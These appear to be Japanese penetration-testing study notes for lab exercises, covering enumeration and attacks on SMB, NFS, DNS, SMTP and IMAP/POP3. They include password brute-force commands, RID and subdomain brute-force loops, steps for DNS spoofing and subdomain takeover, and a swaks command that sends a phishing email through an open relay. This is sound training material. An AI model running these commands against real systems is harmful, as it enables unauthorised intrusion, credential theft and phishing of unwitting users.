```sh
smbmap -H $Target_IP -u "" -p ""
```

smbmapを使うと、各フォルダの権限を確認できる
```sh
smbmap -H $Target_IP
```

フォルダの中を確認できる
```sh
smbmap -H $Target_IP -r notes
```

ユーザー名とパスワードを指定してログイン
```sh
smbmap -H 10.129.206.80 -u svc-alfresco -p 'P@ssw0rd123'
```
- `-R <共有名>` : 再起的に表示

### rpcclient
- `rpcclient`は、SMBサーバーで特定の機能を実行して情報を取得できる

```shell
rpcclient -U "" $Target_IP
```

SMB NULLセッション
```shell
rpcclient -U "" -N $Target_IP
```
rpcclientで使えるコマンド

| クエリコマンド         | 説明                                     |
| --------------- | -------------------------------------- |
| srvinfo         | サーバーの情報を取得する。                          |
| enumdomains     | ネットワーク上に展開されているすべてのドメインを列挙する。          |
| o               | 展開されているドメインのドメイン情報、サーバー情報、ユーザー情報を取得する。 |
| netshareenumall | 利用可能なすべての共有を列挙する。                      |
| netsharegetinfo | 指定した共有に関する情報を取得する。                     |
| enumdomusers    | ドメイン上のすべてのユーザーを列挙する。                   |
| enumdomgroups   | ドメインに存在するすべてのグループを列挙する                 |
| queryuser [RID] | 指定したユーザー（RID ベース）の情報を取得する。             |
#### ユーザー・グループ列挙
2. enumdomusersでユーザーのRIDを取得
3. queryuser [RID]でユーザーの情報を取得

```shell-session
rpcclient $> enumdomusers

user:[mrb3n] rid:[0x3e8]
user:[cry0l1t3] rid:[0x3e9]

rpcclient $> queryuser 0x3e9

        User Name   :   cry0l1t3
        Full Name   :   cry0l1t3
... ユーザー情報
```

- ユーザー列挙の例と同じで、それぞれのコマンドをgroup版に変更すればいいだけ

#### rpcclient を使用したパスワード ポリシーの取得
- `getdompwinfo`コマンド
	- `min_password_length: 8` :「最低パスワード長が 8文字」
	- `DOMAIN_PASSWORD_COMPLEX` : パスワードの複雑さ要件が有効になっている
```shell
rpcclient $> getdompwinfo
min_password_length: 8
password_properties: 0x00000001
	DOMAIN_PASSWORD_COMPLEX
```

#### ブルートフォースによるユーザーRIDの特定
rpcclientを使用したユーザーRIDの特定
- `enumdomusers`では、許可されたユーザーのみが出力される
- なのでブルートフォースによって許可されてないユーザーも出力させる
- 絶対やれ
```shell-session
for i in $(seq 500 1100);do rpcclient -N -U "" $Target_IP -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```

samrdump.pyでも同様のことができる
```shell-session
samrdump.py 10.129.14.128
```

 上のrpcclientで行ったことは、[SMBMap](https://github.com/ShawnDEvans/smbmap) とか [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)でもできる
```shell-session
smbmap -H 10.129.14.128
crackmapexec smb 10.129.14.128 --shares -u '' -p ''
```
 

### enum4linux-ng
インストール
```shell-session
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip3 install -r requirements.txt
```

綺麗に列挙してくれる
- `-A` : **“All”** を意味するオプションで、実行可能なすべての列挙モジュールを走らせるフルスキャンモード
```shell-session
./enum4linux-ng.py $Target_IP -A
```

```shell
snowyowl644@htb[/htb]$ enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

|               |                                                              |
| ------------- | ------------------------------------------------------------ |
| -P            | **Pingなしでスキャンを実行**（-P は “no ping” を意味する）ターゲットが応答しなくてもスキャン継続。 |
| 172.16.5.5    | 対象ホストのIPアドレス                                                 |
| -oA ilfreight | 出力を複数形式（通常・XML・grepable）で ilfreight.* の名前で保存                 |

**パスワード攻撃**
```shell-session
hydra -L user.list -P password.list smb://<IP>
```

たまに、こんなエラーが出る時がある
```shell-session
[ERROR] invalid reply from target smb://10.129.42.197:445/
```
- SMBv3の返信を処理できない古いバージョンのTHC-Hydraがある可能性が高いため
- この問題を回避するために、`hydra`手動で更新して再コンパイルするか、Metasploitが使える
```shell-session
use auxiliary/scanner/smb/smb_login
```

### ブルートフォース
CrackMapExec
- デフォルトだと、SMBのドメイン認証を試す
- `--local-auth` : ターゲットのローカルユーザーアカウントで認証を試す
```shell-session
crackmapexec smb 10.129.203.10 -u "Fiona" -p creds.txt --local-auth
```


## NFS
- 目的は、SMBと同じで、ネットワークを介してローカルであるかのようにファイルシステムにアクセスすること
- [NFS](https://en.wikipedia.org/wiki/Network_File_System)は、LinuxとUnixシステムの間で使われる
- NFSは、分散ファイルシステム

| **バージョン** | **特徴**                                                                                                                                                              |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **NFSv2** | 古いバージョンだが、多くのシステムでサポートされており、当初は完全に UDP 上で動作していた。                                                                                                                    |
| **NFSv3** | 可変ファイルサイズの対応やエラー報告の改善など、多くの機能が追加されたが、NFSv2 クライアントとは完全な互換性がない。                                                                                                       |
| **NFSv4** | Kerberos に対応し、ファイアウォールやインターネット経由で動作可能。ポートマッパーが不要になり、ACL（アクセス制御リスト）をサポート。状態ベースの操作を適用し、パフォーマンスとセキュリティの向上が図られている。また、NFS で初めて **ステートフルプロトコル**（接続状態を保持する通信方式）を採用したバージョン。 |
#### デフォルト設定の把握
- `/etc/exports`ファイルには、クライアントがアクセスできるNFSサーバー上の物理ファイルシステムのテーブルが書いてある
- [NFSエクスポートテーブルは](http://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html)、どのオプションを受け入れるかを示し、したがってどのオプションが利用可能かを示す
```shell-session
cat /etc/exports 
```
上のコマンドによって出力されるドキュメントの中のオプション一覧

| Option           | Description                                                                       |
| ---------------- | --------------------------------------------------------------------------------- |
| rw               | 読み書きの権限を許可する。                                                                     |
| ro               | 読み取り専用の権限を設定する。                                                                   |
| sync             | 同期データ転送を使用。（やや遅い）                                                                 |
| async            | 非同期データ転送を使用。（やや高速）                                                                |
| secure           | 1024 番以上のポートを使用しない。                                                               |
| insecure         | 1024 番以上のポートを使用する。                                                                |
| no_subtree_check | サブディレクトリツリーのチェックを無効にする。                                                           |
| root_squash      | root（UID/GID 0）のファイルのすべての権限を匿名 UID/GID に割り当て、NFS マウント上で root がファイルにアクセスできないようにする。 |
#### 注目すべき誤った設定
- rw
- insecure
と下の二つ

| option         | description                                                                   |
| -------------- | ----------------------------------------------------------------------------- |
| nohide         | エクスポートされたディレクトリの下に別のファイルシステムがマウントされている場合、そのディレクトリは独自のエクスポートエントリによってエクスポートされる。 |
| no_root_squash | root が作成したファイルは、そのまま UID/GID 0 の権限を保持する。                                      |
### 情報収集(コマンド)
```shell-session
sudo nmap --script nfs* $Target_IP -sV -p111,2049
```

### NFSサービスを発見したら

#### ローカルマシンにマウント
1. このために、NFS共有がマウントされる新しい空のフォルダを作成できる
2. マウントすると、ローカルシステムと同じようにコンテンツを表示できる
3. 表示および表示可能なファイルが属する権利、ユーザー名、およびグループにアクセスする

具体的なコマンド
- 利用可能なNFSを表示する
```shell-session
showmount -e $Target_IP
```

- NFSのマウント
```shell-session
mkdir target-NFS
sudo mount -t nfs $Target_IP:/ ./target-NFS/ -o nolock
cd target-NFS
tree .
```

- ユーザー名とグループ名を含むリストの表示
```shell-session
ls -l mnt/nfs/
```
- UIDとGUIDを含むリストコンテンツ
```shell-session
ls -n mnt/nfs/
```

- root_squash オプションが設定されている場合、root であってもファイルを編集できない。
- NFS を利用して権限昇格を試みることも可能!!!
	- 例えば、SSH でシステムにアクセスできる場合、他のフォルダ内の特定ユーザーが読み取れるファイルを取得するための方法がある。
	- そのユーザーの SUID を持つシェルを NFS 共有にアップロードし、SSH ユーザーとして実行することで、そのユーザー権限で操作可能になる。

#### アンマウント
```shell-session
cd ../
sudo umount ./target-NFS
```

## DNS
- ドメインとIPの名前解決
- DNS クエリにはさまざまな `DNS records`が使用され、それぞれにさまざまなタスクがある
- さらに、ドメインのメールサーバーやその他のサーバーを設定できるため、さまざまな機能に個別のエントリがある
- FQDNとは
	- **インターネット上のホスト（コンピューターやサーバー）を一意に識別するための完全なドメイン名**
		- `www.google.com`
		- `mail.yahoo.co.jp`
		- `ns1.inlanefreight.htb`
	- FQDNは、DNSで一意に識別される

- アセットの発見（Uncovering Assets）
    - DNSレコードからは、サブドメイン、メールサーバー、ネームサーバーなど**多くの情報**を得られる
    - 例: CNAMEレコードが古いサーバーを指している場合（`dev.example.com CNAME oldserver.example.net`）、**脆弱性**に繋がる恐れがある
- ネットワークインフラストラクチャのマッピング（Mapping the Network Infrastructure）
    - DNSデータを分析することで、ターゲットのネットワークインフラを**包括的に把握**できる
    - 例: ドメインのNSレコードから**使用中のホスティングプロバイダー**が分かる
    - 例: `loadbalancer.example.com`のAレコードからロードバランサーを**特定**
    - これにより、システム間の接続状況やトラフィックフローが分かり、**ペネトレーションテスト時に悪用され得る弱点やチョークポイント**を洗い出せる
- 変更の監視（Monitoring for Changes）
    - DNSレコードを**継続的に監視**することで、ターゲットのインフラの変更を**時系列で追跡**できる
    - 例: 新しいサブドメイン（`vpn.example.com`）の急な登場は、ネットワークへの新たなエントリポイントを示唆
    - 例: `_1password=...`のような値を含むTXTレコードは、組織が1Passwordを使用していることを示すため、**ソーシャルエンジニアリング攻撃や特定のフィッシングキャンペーン**に悪用される可能性がある

| DNSレコード | 説明                                                                                                                                        |
| ------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| A       | 要求されたドメインの **IPv4アドレス** を返す。                                                                                                              |
| AAAA    | 要求されたドメインの **IPv6アドレス** を返す。                                                                                                              |
| MX      | ドメインに対する **メールサーバーの情報** を返す。                                                                                                              |
| NS      | ドメインの **DNSサーバー（ネームサーバー）** を返す。                                                                                                           |
| TXT     | 様々な情報を含むレコード。Google検索コンソールの検証、SSL証明書の検証、SPFやDMARCを用いたメール認証・スパム防止などに使用される。                                                                 |
| CNAME   | 別のドメインの **エイリアス** として機能する。例: `www.example.com` を `example.com` と同じIPにする場合、`example.com` の A レコードを設定し、`www.example.com` の CNAME レコードを作成する。 |
| PTR     | **逆引きDNS（リバースルックアップ）** に使用され、IPアドレスを対応するドメイン名に変換する。                                                                                       |
| SOA     | ドメインのゾーンファイルにある<br>ドメインの操作を担当する人と、ドメインのDNS情報の管理方法を表示してくれる<br>**DNSゾーン情報** と **管理者のメールアドレス** を提供する。                                        |

DNSゾーンのこと

| ステップ                             | 説明                                                                                                                               |
| -------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| **Zone Transfer Request (AXFR)** | セカンダリDNSサーバーは、プライマリサーバーに対してゾーン転送要求（AXFR）を送信してプロセスを開始します。                                                                         |
| **SOA Record Transfer**          | リクエストを受信すると（セカンダリサーバーを認証する可能性がある）、プライマリサーバーはSOA（開始権限）レコードを返します。SOAレコードにはシリアル番号などのゾーン情報が含まれ、セカンダリサーバー側でゾーンデータが最新かどうかを判断するのに役立ちます。 |
| **DNS Records Transmission**     | プライマリサーバーはゾーン内のすべてのDNSレコードをセカンダリサーバーに転送します。これにはA、AAAA、MX、CNAME、NSなど、ドメインのサブドメイン・メールサーバー・ネームサーバーなどの情報を定義するレコードが含まれます。             |
| **Zone Transfer Complete**       | すべてのレコードが送信されると、プライマリサーバーはゾーン転送の終了を通知します。セカンダリサーバーはこれによってゾーンデータの完全なコピーを受け取ったことを確認できます。                                           |
| **Acknowledgement (ACK)**        | セカンダリサーバーは、ゾーンデータの受信と処理が成功したことを示す確認メッセージをプライマリサーバーに送信し、ゾーン転送プロセスが完了します。                                                          |


全てのDNSサーバーは、3つの異なる構成ファイルで動作する
4. ローカルDNS構成ファイル
5. ゾーンファイル
6. 逆名解決ファイル

- DNSサーバー[Bind9](https://www.isc.org/bind/)は、Linuxベースのディストリビューションで非常に頻繁に使用される
	- ローカル構成ファイル（`named.conf`）は、大まかに2つのセクションに分かれている
	- 1つ目は、一般設定のオプションセクション、2つ目は、個々のドメインのゾーンエントリ
- `/etc/bind/named.conf.local`
- `named.conf.options`
- `named.conf.log`

- **ゾーンの定義**
    - さまざまなゾーンを定義可能
    - ゾーンは個々のファイルに分割
    - 通常1つのドメインに対応（一部例外あり）
    - ISPやパブリックDNSサーバーは例外
- **ゾーンファイルの概要**
    - BIND形式で記述されるテキストファイル
    - DNSツリーにおける委任ポイント
    - 業界標準のゾーンファイルフォーマット
ゾーンファイルの中身を見る
```shell-session
cat /etc/bind/db.domain.com
```


- Fully Qualified Domain Name（FQDN）からIPアドレスを解決するには、DNSサーバーに逆ルックアップファイルが必要
- コンピューター名（FQDN）は、PTRレコードを使用して、それぞれのホストに対応するIPアドレスの最後のオクテットに割り当てられる。
- PTRレコードはIPを名前に逆変換する
逆名前解決ゾーンファイルの中身をみる
```shell-session
cat /etc/bind/db.10.129.14
```

### 注目すべき誤った設定
- DNSサーバーが攻撃される方法はたくさんある
- BIND9サーバーを標的とする脆弱性のリストは、[CVEdetails](https://www.cvedetails.com/product/144/ISC-Bind.html?vendor_id=64)で見つけることができる
- DNSサーバーに対する最も一般的な攻撃の[リスト](https://securitytrails.com/blog/most-popular-types-dns-attacks)もある
- 以下に示す設定の一部は、とりわけこれらの脆弱性につながる
	- DNSは非常に複雑になり、エラーがこのサービスに侵入しやすいため、管理者は正確な解決策が見つかるまで問題を回避する必要がある

| オプション           | 説明                                |
| --------------- | --------------------------------- |
| allow-query     | DNSサーバーへの問い合わせを許可するホストを定義します。     |
| allow-recursion | DNSサーバーへの再帰的な問い合わせを許可するホストを定義します。 |
| allow-transfer  | DNSサーバーからのゾーン転送を受信できるホストを定義します。   |
| zone-statistics | ゾーンに関する統計情報を収集します。                |
#### 情報収集(コマンド)
CTFでDNSをコネコネする時
```sh
sudo nano /etc/hosts
dig AXFR inlanefreight.htb @$Target_IP
```
以下のそれぞれのレコードの照会は、全て「AUTHORITY SECTION」に聞いてる答えが返ってくる
- SOAレコードの照会
	- このドメインの管理情報を教えて？
	- メールアドレスのドット（.）は、at記号（@）に置き換えられる
```shell-session
dig soa <ドメイン>
```

- SOAレコードに書いてある権威DNSサーバーのドメインのIPを調べる
```sh
dig <SOAレコードに書いてあるドメイン>
```

- NS（ネームサーバー）レコードの照会
	- このドメインのネームサーバー（NS）はどこ？って聞いてる
```shell-session
dig ns <ドメイン> @<権威DNSサーバーのIP>
```


- DNSサーバーのバージョンを取得
	- このDNSサーバーはどのバージョンのBINDを使っている？
```shell-session
dig CH TXT version.bind <ドメインのIP>
```

- 可能な限り多くの情報を取得
```shell-session
dig any inlanefreight.htb @<権威DNSサーバーのIP>
```

- ゾーン転送が許可されている場合、このドメインのすべてのDNSレコードが取得できる
	- これが成功すると、攻撃者に **内部ネットワークの情報が漏れる可能性がある。**
	- ターゲット組織のDNS名前空間の詳細を知り、攻撃面を増やすことができる
```shell-session
dig axfr inlanefreight.htb @<権威DNSサーバーのIP>
```

```shell-session
dig axfr internal.inlanefreight.htb @<権威DNSサーバーのIP>
```

| コマンド                          | 説明                                                                            |
| ----------------------------- | ----------------------------------------------------------------------------- |
| dig domain.com                | ドメインのデフォルトのAレコードルックアップを実行します。                                                 |
| dig domain.com A              | ドメインに関連付けられたIPv4アドレス（Aレコード）を取得します。                                            |
| `dig domain.com AAAA`         | ドメインに関連付けられたIPv6アドレス（AAAAレコード）を取得します。                                         |
| dig domain.com MX             | ドメインを担当するメールサーバー（MXレコード）を見つけます。                                               |
| dig domain.com NS             | ドメインの信頼できるネームサーバー（NSレコード）を識別します。                                              |
| dig domain.com TXT            | ドメインに関連付けられたTXTレコードを取得します。                                                    |
| dig domain.com CNAME          | ドメインの正規名（CNAME）レコードを取得します。                                                    |
| dig domain.com SOA            | ドメインの開始権限（SOA）レコードを取得します。                                                     |
| dig @1.1.1.1 domain.com       | 照会する特定の名前サーバーを指定します。この場合は1.1.1.1を使用してクエリを実行します。                               |
| dig +trace domain.com         | DNS解決の完全なパスを表示します。                                                            |
| dig -x 192.168.1.1            | IPアドレス192.168.1.1の逆引き（リバースルックアップ）を行い、関連するホスト名を見つけます。ネームサーバーを指定する必要がある場合があります。 |
| dig +short domain.com         | クエリに対する短く簡潔な回答を表示します。                                                         |
| dig +noall +answer domain.com | クエリ出力の回答セクションのみを表示します。                                                        |
| dig domain.com ANY            | ドメインで利用可能なすべてのDNSレコードを取得します（多くのDNSサーバーでは負荷削減・悪用防止のために無視される可能性があります）。          |
**上のこういうのをやってくれるツール**
- [DNSenum](https://github.com/fwaeytens/dnsenum)
	- ここで、指定するIPは、`dig ドメイン名`で出力される`;; SERVER: 1.1.1.1#53(1.1.1.1) (UDP)`のIP
```shell-session
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

- [Fierce](https://github.com/mschwager/fierce)
	- ルート ドメインのすべての DNS サーバーを列挙し、DNS ゾーン転送をスキャンする
```shell-session
fierce --domain zonetransfer.me
```


#### サブドメインブルートフォース

```shell-session
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
```

```shell-session
./subfinder -d inlanefreight.com -v       
```

外部DNSリゾルバが使えない環境でも、内部ネットワークのDNS情報を効率的に収集できる
subbrute
```shell-session
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt
```


#### ドメインテイクオーバー
**攻撃概要**
- 存在しない、または期限切れのドメインを再登録することで、本来の所有者の管理下にあるはずのドメインやサブドメインを乗っ取る手法
- 攻撃者は、期限切れのドメインを発見し、それを自分のものとして主張することで、悪意のあるウェブコンテンツのホスティングやフィッシング攻撃など、さらなる攻撃に利用できる
- DNSの正引き名（CNAME）レコードは、異なるドメインを親ドメインに紐づけるために利用されます
例えば、以下のようなCNAMEレコードが設定されている場合
```
sub.target.com.   60   IN   CNAME   anotherdomain.com
```
- もし anotherdomain.com のドメインが期限切れになり、誰でも登録できる状態になった場合、target.com のDNSサーバーには依然としてこのCNAMEレコードが残るため、anotherdomain.com を再登録した攻撃者が、DNSレコードが更新されるまで sub.target.com を完全に制御できるようになる。

**具体的な攻撃の流れと実行コマンド**
1. **サブドメインの列挙:**
- 対象ドメインのサブドメインを列挙した結果を保存する
subfinder を使用する場合
```sh
subfinder -d example.com -o subdomains.txt
```

amass を使用する場合
```sh
amass enum -d example.com -o subdomains.txt
```

2. **自動化ツールを使ったチェック**
リスト化したサブドメイン（subdomains.txt）に対して、それぞれのCNAMEターゲットがテイクオーバー可能かどうかをチェックする
```sh
subjack -w subdomains.txt -t 100 -timeout 30 -ssl -c fingerprints.json -v
```

5. **再登録による乗っ取り:**
期限切れのドメインが見つかった場合、そのドメインを再登録し、DNSレコードが更新されるまでの間、ターゲットサブドメインを完全に制御します。



#### DNSキャッシュポイズニング
- Man-in-the-Middle（`MITM`）攻撃で、ユーザーとDNSサーバー間の通信を傍受して、ユーザーを正当な宛先ではなく不正な宛先にルーティングする
- DNSサーバーで見つかった脆弱性を悪用すると、攻撃者がサーバーを制御してDNSレコードを変更する可能性がある

ローカルネットワーク内では、EttercapやBettercapなどのMITMツールを使用してDNSキャッシュポイズニング攻撃を行うことも可能

**Ettercapの設定**
`/etc/ettercap/etter.dns`ファイルを設定する必要がある
ファイル内の構成
```sh
偽装したいターゲットドメイン      A   ユーザーをリダイレクトさせたい攻撃者のIPアドレス
inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110
```

**ネットワークスキャン**
Ettercapツールを起動し、[Hosts > Scan for Hosts] を選択してネットワーク内の生存ホストをスキャンする
スキャン完了後、ターゲットのIPアドレス（例: 192.168.152.129）をTarget1に、デフォルトゲートウェイのIP（例: 192.168.152.2）をTarget2に設定する

**dns_spoofプラグインの有効化・攻撃の実行**
[Plugins > Manage Plugins] に移動し、dns_spoof攻撃を有効にする
ターゲットマシンに対して、inlanefreight.comがIPアドレス192.168.225.110に解決される偽のDNS応答が送信される
また、ターゲットマシンからinlanefreight.comへのpingも、192.168.225.110に解決される

## SMTP
- `Simple Mail Transfer Protocol`（`SMTP`）は、IPネットワークで電子メールを送信するためのプロトコル
	- 本質的な機能は、許可されたユーザーのみが電子メールを送信できるようにする認証メカニズムを使用してスパムを防止すること
- ポート25を使うが、新しいSMTPサーバー(`ESMTP`)は587とかも使う
	- 認証されたユーザー/サーバーからのメールの受信用
	- SSL/TLSと組み合わせることで暗号化した通信を行う(TCP 465番とか)
	- `EHLO`コマンドの後に`STARTTLS`を送信して行う
7. MUA（Mail User Agent）がメールを **ヘッダー** と **本文** に分けてSMTPサーバーへ送信。
8. SMTPサーバーには、メールの送受信を管理する **MTA** が搭載。
    - MTAはメールの **サイズ・スパムチェックを行い、保存する**。
9. MTAの負担軽減のため、MSA（Mail Submission Agent）が **前段に配置** されることがある。
	 - MSAはメールの送信元の **正当性を確認** し、「**リレーサーバー（Relay Server）**」とも呼ばれる。
10. リレーサーバーの設定ミスにより、**オープンリレー攻撃（Open Relay Attack）** が起こることがある
11. 最後にMTAは **DNSを検索し、受信メールサーバーのIPアドレスを特定** する
12. 宛先のSMTPサーバーに到着すると、データパケットが再構成され、完全な電子メールが形成される
13. そこから、`Mail delivery agent`（`MDA`）はそれを受信者のメールボックスに転送する

| Client (`MUA`) | `➞` | Submission Agent (`MSA`) | `➞` | Open Relay (`MTA`) | `➞` | Mail Delivery Agent (`MDA`) | `➞` | Mailbox (`POP3`/`IMAP`) |
| -------------- | --- | ------------------------ | --- | ------------------ | --- | --------------------------- | --- | ----------------------- |
### プロトコル固有の欠点
- SMTPを使ってメールを送信しても、確実な配信確認が得られないこと
	- 未配信の時は、メッセージのヘッダーとともに、英語のエラーメッセージが返されるだけ
- SMTPでは接続時にユーザー認証が行われないため、メールの送信者情報を信頼できないこと
	- オープンリレーのSMTPサーバーがスパムメールの大量送信に悪用されることがよくある
	- 攻撃者は送信者アドレスを偽装（メールスプーフィング）し、追跡を回避する
		- 不審なメールを拒否したり、隔離フォルダ（スパムフォルダ）に移動する対策
		- 送信者の正当性を検証する **DomainKeys Identified Mail（DKIM）** や **Sender Policy Framework（SPF）** などの認証プロトコルもその対策例の一つ


### デフォルト設定の把握

```shell-session
cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
```

| **Command** | **Description (日本語訳)**                          |
| ----------- | ----------------------------------------------- |
| AUTH PLAIN  | AUTH はクライアントを認証するために使用されるサービス拡張                 |
| HELO        | クライアントは自分のコンピューター名を使ってログインし、セッションを開始する          |
| MAIL FROM   | クライアントはメールの送信元を指定する                             |
| RCPT TO     | クライアントはメールの受信先を指定する                             |
| DATA        | クライアントはメールの送信を開始する                              |
| RSET        | クライアントは開始した送信を中断しますが、クライアントとサーバーの接続は維持する        |
| VRFY        | クライアントはメッセージ転送が可能なメールボックスかどうかを確認する              |
| EXPN        | クライアントはこのコマンドを使用しても、メッセージに利用可能なメールボックスかどうかを確認する |
| NOOP        | クライアントはタイムアウトによる切断を防ぐため、サーバーからの応答を要求する          |
| QUIT        | クライアントはセッションを終了する                               |


### 危険な設定
- 受信者が信頼するリレーサーバーを使用すれば、スパムフィルターによるブロックを回避できるが、必ずリレーサーバーへの認証が必要。
- 管理者が許可 IP 範囲を把握していないと、SMTP サーバーの誤設定（オープンリレーなど）が起きやすい。
	- オープンリレーの問題点
		- スパマーや攻撃者が自由にメールを転送できるため、大量の迷惑メールやフィッシングメールの踏み台にされる可能性が高い
		- 知らぬ間に攻撃者に利用されると、サーバーのドメインや IP アドレスがブラックリストに登録されるリスクがある
- `mynetworks = 0.0.0.0/0` と設定してしまうと、世界中のどの IP アドレスからもリレーを許可してしまうため、オープンリレーになる
- 盗み見ることもできてしまう
```shell-session
mynetworks = 0.0.0.0/0
```

### 情報収集(コマンド)
- Nmap の `smtp-commands` スクリプトは、EHLO コマンドを使って対象 SMTP サーバーが受け付けるコマンドを一覧表示できる。
```shell-session
sudo nmap $Target_IP -sC -sV -p25 -Pn
```

- `smtp-open-relay` という Nmap のスクリプトを使って、対象の SMTP サーバーが “オープンリレー” として利用できるかどうかをテストできる
	- 　オープンリレー : **認証なしで誰でも自由にメールを送信できるSMTPサーバーのこと**
```shell-session
sudo nmap ＄Target_IP -p25 --script smtp-open-relay -v -Pn
```

オープンリレーだった場合は、任意のメールクライアントを使って、メールを送信できる
```shell-session
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```

#### Telnet
- `telnet`ツールを使用してSMTPサーバーとのTCP接続ができる
```shell-session
telnet $Target_IP 25
```
**telnet内でのコマンド**
これらは常に機能するわけではなく、設定ミスで実行できるものもあるかもしれない

`VRFY`コマンド
- システム上の既存のユーザーを列挙できる
```shell-session
VRFY <Username or MailAddress>
```

`EXPN`コマンド
メーリングリストと一緒に使用すると、そのリストに含まれるすべてのユーザーのメールアドレスが表示される
- メーリングリスト : 特定のグループのメンバー全員にメールを一斉送信できる仕組み
	- 例えば、「support-team@example.com」というメーリングリストに `carol@example.com` と `elisa@example.com` の2人が登録されていて、`support-team@example.com`にメールを送ると、`carol@example.com` と `elisa@example.com` の両方に同じメールが届くという仕組み
```shell-session
EXPN <Username or MailAddress> or MailingList>
```

`RCPT TO`コマンド
メールアドレスが存在するかを確かめることができる
```sh
RCPT TO : <Username or MailAddress>
```

### ユーザー列挙の自動化
- Nmap,smtp-user-enum,msfconsole、それぞれで結果が異なることがあるから、　それぞれきちんと試す。
- 一つのツールで出てこなかったからと言って落ち込まずに他の手法も試せ。
```sh
sudo nmap -p 25 $Target_IP --script smtp-enum-users
```

- Pentestmonkey などが提供している「smtp-user-enum」というツールを使う方法もある
	- [smtp-user-enum (GitHub)](https://github.com/pentestmonkey/smtp-user-enum) や Pentestmonkey公式サイト などで配布されている。
```sh
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t $Target_IP
```

- Metasploitでもできる
```sh
msfconsole
msf > search smtp_enum
msf > use auxiliary/scanner/smtp/smtp_enum

```



## IMAP/POP3
- IMAP (Internet Message Access Protocol)
	- メールをサーバー上で直接オンライン管理できるプロトコル
	- フォルダ構造をサポート
	- クライアント・サーバーモデルに基づき、複数クライアント間で同期が可能
	- メールをネットワークファイルシステムのように扱える
- POP3 (Post Office Protocol)
	- IMAP と比べ機能が限定的
	- サーバー上でメールの一覧表示、取得、削除のみ可能
- IMAP を使用すべきケース
	- サーバー上での階層的なメールボックス運用
	- セッション中に複数のメールボックスへアクセス
	- メールの事前振り分けや選別が必要な場合

### デフォルト設定
- IMAPの場合

| **Command**                   | **Description (日本語訳)**               |
| ----------------------------- | ------------------------------------ |
| 1 LOGIN username password     | ユーザーのログイン。                           |
| 1 LIST "" *                   | すべてのディレクトリ（メールボックス）を一覧表示。            |
| 1 CREATE "INBOX"              | 指定した名前でメールボックスを作成。                   |
| 1 DELETE "INBOX"              | メールボックスを削除。                          |
| 1 RENAME "ToRead" "Important" | メールボックス名を変更。                         |
| 1 LSUB ""                     | ユーザーがアクティブまたは購読しているディレクトリ名のサブセットを返す。 |
| 1 SELECT INBOX                | メールボックスを選択し、メッセージにアクセス可能にする。         |
| 1 UNSELECT INBOX              | 選択中のメールボックスを解除。                      |
| 1 FETCH [ID] all              | メールボックス内の特定メッセージに関連するデータを取得。         |
| 1 CLOSE                       | 「Deleted」フラグが設定されたすべてのメッセージを削除。      |
| 1 LOGOUT                      | IMAP サーバーとの接続を終了。                    |
- POP3の場合

| **Command**       | **Description (日本語訳)**               |
| ----------------- | ------------------------------------ |
| **USER username** | ユーザー名を指定し、ユーザーを識別する。                 |
| **PASS password** | パスワードを使ってユーザーを認証する。                  |
| **STAT**          | サーバーに保存されているメールの数を要求する。              |
| **LIST**          | サーバーに保存されているすべてのメールの番号とサイズを要求する。     |
| **RETR id**       | 指定した ID のメールをサーバーから取得するよう要求する。       |
| **DELE id**       | 指定した ID のメールをサーバーから削除するよう要求する。       |
| **CAPA**          | サーバーがサポートしている機能（ケイパビリティ）を表示するよう要求する。 |
| **RSET**          | サーバーが受け取った削除指示等の情報をリセットするよう要求する。     |
| **QUIT**          | POP3 サーバーとの接続を終了する。                  |
### 危険な設定
- FTPサービスと同様に、サービスで実行されたコマンドのデバッグや匿名でのログインなど、より多くの情報を得ることができる
- 多くの設定ミスを犯す可能性があり、最悪の場合、機密情報や機密情報を含む可能性のあるすべての電子メールを送受信できてしまう
危険な設定の例

| **Setting**                 | **Description (日本語訳)**                        |
| --------------------------- | --------------------------------------------- |
| **auth_debug**              | すべての認証デバッグログを有効にします。                          |
| **auth_debug_passwords**    | ログの詳細度を調整し、送信されたパスワードや認証スキームをログに出力します。        |
| **auth_verbose**            | 失敗した認証試行とその理由をログに記録します。                       |
| **auth_verbose_passwords**  | 認証に使用されたパスワードをログに記録します（短縮表示なども可能）。            |
| **auth_anonymous_username** | ANONYMOUS SASL メカニズムでログインする際に使用するユーザー名を指定します。 |

### 情報収集(コマンド)
- ドメイン名、電子メールサーバーの所属、利用可能なコマンド
```shell-session
sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
```

- 従業員の アクセス資格情報がわかると、攻撃者はメール サーバーにログインし、個々のメッセージを読み取ったり送信したりできる
```shell-session
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
```

- `verbose`（`-v`）オプションも使用すると、接続がどのように行われるかがわかる
	- 具体的には、暗号化に使用されるTLSのバージョン、SSL証明書の詳細、さらにはメールサーバーのバージョンを含むことが多いバナーもわかる
 ```shell-session
curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v
```

- SSL を介して IMAP または POP3 サーバーと対話するには、openssl と ncat を使用できる
```shell-session
openssl s_client -connect 10.129.14.128:pop3s
```

